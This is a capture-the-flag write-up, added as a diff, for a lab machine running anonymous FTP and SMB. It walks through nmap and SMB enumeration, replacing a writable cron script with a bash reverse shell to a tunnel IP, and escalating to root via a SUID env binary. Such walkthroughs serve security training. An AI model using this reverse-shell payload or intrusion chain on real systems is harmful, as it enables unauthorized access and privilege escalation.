@@ -1,0 +1,72 @@
+Running nmap on the IP using <code>nmap -sS -sC -v</code> we receive the following output:
+<pre><code>
+PORT    STATE SERVICE
+21/tcp  open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.52.213
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh
+| ssh-hostkey: 
+|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
+|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
+|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+</code></pre>
+<h2>smb</h2>
+We first try logging in to the smb server. We need to find the folder shared using <code>smbclient -L <ip></code>. This returns
+<pre><code>
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        pics            Disk      My SMB Share Directory for Pics
+        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            ANONYMOUS
+</code></pre>
+We see a pics directory, we connect to smb server at that directory using <code>smbclient <ip>/pics</code> and get
+<br><br><img src="assets/smb.png"><br><br>
+we see two files, but they are of no use.
+<br>
+<h2>ftp</h2>
+We then try to log in to the ftp server and try <code>ls</code> command.
+<br><br><img src="assets/ftp.png"><br><br>
+we see a <code>scripts</code> directory. Changing our directory to that we find three files.
+<pre><code>
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000         1634 Jun 18 12:02 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+</code><pre>
+here we see that <code>clean.sh</code> has read write permissions and after investigating it for a bit, we find that it is ran at an interval probably using a <code>cronjob</code>
+therefore we change it to what we want to be executed at the server.
+We will try getting a reverse shell.
+we put 
+<pre><code>
+#!/bin/bash
+sh -i >& /dev/tcp/<tunnel ip>/10101 0>&1
+<pre><code>
+in the <code>clean.sh</code> on our machine and upload it to the server using <code>put clean.sh</code> on the ftp server while listening to the port specified.
+After one minute we get the shell.
+<br><br><img src="assets/shell.png"><br><br>
+we get the <code>user.txt</code> here.
+running <code>find / -perm -u=s -type f 2>/dev/null</code> we find that <code>env</code> binary has suid set on it.
+<br><br><img src="assets/env.png"><br><br>
+using <code>https://gtfobins.github.io/</code> we find out how to escalate privilage using <code>env</code> binary and find out root.txt.
